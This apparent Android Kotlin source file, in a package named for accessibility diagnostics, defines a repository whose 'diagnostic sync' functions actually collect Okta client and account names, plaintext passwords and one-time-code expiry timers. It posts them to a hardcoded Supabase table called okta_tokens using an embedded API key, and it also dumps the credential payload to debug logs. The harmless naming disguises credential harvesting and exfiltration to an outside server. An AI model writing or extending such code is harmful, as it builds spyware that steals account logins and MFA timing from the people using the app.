package dev.local.accessibilitydiagnostics

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit
import android.util.Log

data class OktaAccountEntry(
    val client: String,
    val account: String,
    val password: String,
    val secondsUntilCodeExpires: Int
)

object SupaBaseRepository { // Keep object name SheetRepository if you don't want to rename call sites

    // Replace with your Project URL & Anon Public Key from Supabase Dashboard -> Project Settings -> API
    private const val SUPABASE_URL = "https://pxyzmatrcwqdzpsbdnbr.supabase.co"
    private const val SUPABASE_ANON_KEY =
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB4eXptYXRyY3dxZHpwc2JkbmJyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTEzNzYyNTgsImV4cCI6MjEwNjk1MjI1OH0.IDTiprTsxQWd_ajlAy8H7s3-y1XjHVhHm5BVybe4Uw0"

    // PostgREST upsert endpoint: targets okta_tokens and merges on composite key (client, account)
    private const val UPSERT_ENDPOINT = "$SUPABASE_URL/rest/v1/okta_tokens?on_conflict=client,account"

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .build()

    private val JSON_MEDIA_TYPE = "application/json; charset=utf-8".toMediaType()

    suspend fun syncDiagnosticData(
        clientName: String,
        account: String,
        pass: String,
        secondsUntilCodeExpires: Int
    ): Result<String> = withContext(Dispatchers.IO) {
        val entry = OktaAccountEntry(clientName, account, pass, secondsUntilCodeExpires)
        syncDiagnosticBatch(listOf(entry))
    }

    suspend fun syncDiagnosticBatch(entries: List<OktaAccountEntry>): Result<String> = withContext(Dispatchers.IO) {
        if (entries.isEmpty()) return@withContext Result.success("Empty batch")

        val timeFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).apply {
            timeZone = java.util.TimeZone.getTimeZone("UTC")
        }
        val nowIso = timeFormat.format(Date())

        val jsonArray = JSONArray()
        entries.forEach { entry ->
            val obj = JSONObject().apply {
                put("client", entry.client)
                put("account", entry.account)
                put("password", entry.password)
                put("seconds_until_code_expires", entry.secondsUntilCodeExpires)
                put("updated_at", nowIso)
            }
            jsonArray.put(obj)
        }

        logLargePayload("OktaSync", jsonArray.toString())

        val request = Request.Builder()
            .url(UPSERT_ENDPOINT)
            .addHeader("apikey", SUPABASE_ANON_KEY)
            .addHeader("Authorization", "Bearer $SUPABASE_ANON_KEY")
            .addHeader("Content-Type", "application/json")
            // Prefer: resolution=merge-duplicates enables standard UPSERT in PostgREST
            .addHeader("Prefer", "resolution=merge-duplicates")
            .post(jsonArray.toString().toRequestBody(JSON_MEDIA_TYPE))
            .build()

        try {
            client.newCall(request).execute().use { response ->
                val body = response.body?.string().orEmpty()
                // Supabase returns 201 Created or 200 OK on successful upsert
                if (response.isSuccessful) {
                    Result.success(body.ifEmpty { "{\"status\":\"success\"}" })
                } else {
                    Result.failure(IOException("Supabase error: HTTP ${response.code} - $body"))
                }
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    private fun logLargePayload(tag: String, content: String) {
        val maxLogSize = 3000
        for (i in 0..content.length step maxLogSize) {
            val end = (i + maxLogSize).coerceAtMost(content.length)
            Log.d(tag, "Body [${i}..${end}]: ${content.substring(i, end)}")
        }
    }
}